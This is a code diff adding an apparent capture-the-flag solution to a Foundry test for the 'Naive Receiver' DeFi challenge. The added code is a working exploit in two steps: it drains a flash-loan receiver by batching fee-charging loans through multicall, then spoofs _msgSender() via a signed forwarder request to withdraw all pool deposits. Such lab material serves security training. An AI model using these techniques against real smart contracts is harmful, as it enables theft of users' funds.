@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
 import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import { console } from "forge-std/console.sol";
+import {Eip712Helper} from "./Eip712Helper.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -77,7 +79,85 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+        step1_withdrawFundsFromFlReceiver();
+        step2_withdrawFundsFromPool();
+    }
+
+    /// @notice Anyone can initiate a flash loan on FlashLoanReceiver
+    function step1_withdrawFundsFromFlReceiver() public {
+        uint256 receiverBalanceBefore = weth.balanceOf(address(receiver));
+        assertEq(receiverBalanceBefore, WETH_IN_RECEIVER, "Unexpected balance in receiver contract");
+
+        // only pay fee
+        uint256 amount = 0;
+
+        bytes[] memory data = new bytes[](10);
+        for (uint256 i = 0; i < 10; i++) {
+            data[i] = abi.encodeWithSelector(
+                NaiveReceiverPool.flashLoan.selector,
+                receiver,
+                address(weth),
+                amount,
+                bytes("")
+            );
+        }
+        bytes memory multicallData = abi.encodeWithSelector(
+            Multicall.multicall.selector,
+            data
+        );
+        pool.multicall(data);
+
+        uint256 receiverBalanceAfter = weth.balanceOf(address(receiver));
+        assertEq(receiverBalanceAfter, 0, "Unexpected balance in receiver contract");
+    }
+
+    /// @notice We can manipulate _msgSender() to withdraw funds from deployer by using multicall from forwarder
+    function step2_withdrawFundsFromPool() public {
+        uint256 poolWethBalance = weth.balanceOf(address(pool));
+        uint256 totalDeposits = pool.totalDeposits();
+        uint256 poolTotal = WETH_IN_POOL + WETH_IN_RECEIVER;
         
+        assertEq(poolWethBalance, totalDeposits, "Unexpected balance in pool");
+        assertEq(poolWethBalance, poolTotal, "Unexpected balance in pool");
+
+        uint256 deployerDeposits = pool.deposits(deployer);
+        assertEq(deployerDeposits, poolTotal, "Unexpected balance in deployer deposits");
+
+        bytes memory withdrawData = abi.encodeWithSelector(
+            NaiveReceiverPool.withdraw.selector,
+            poolTotal,
+            recovery
+        );
+        bytes memory withdrawDataWithFakeMsgSender = abi.encodePacked(
+            withdrawData,
+            deployer
+        );
+        
+        bytes[] memory data = new bytes[](1);
+        data[0] = withdrawDataWithFakeMsgSender;
+
+        bytes memory multicallData = abi.encodeWithSelector(
+            Multicall.multicall.selector,
+            data
+        );
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1000000,
+            nonce: forwarder.nonces(player),
+            data: multicallData,
+            deadline: block.timestamp + 1000
+        });
+
+        Eip712Helper eip712 = new Eip712Helper();
+
+        bytes32 digest = eip712.hashTypedData(request, address(forwarder));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
     }
 
     /**
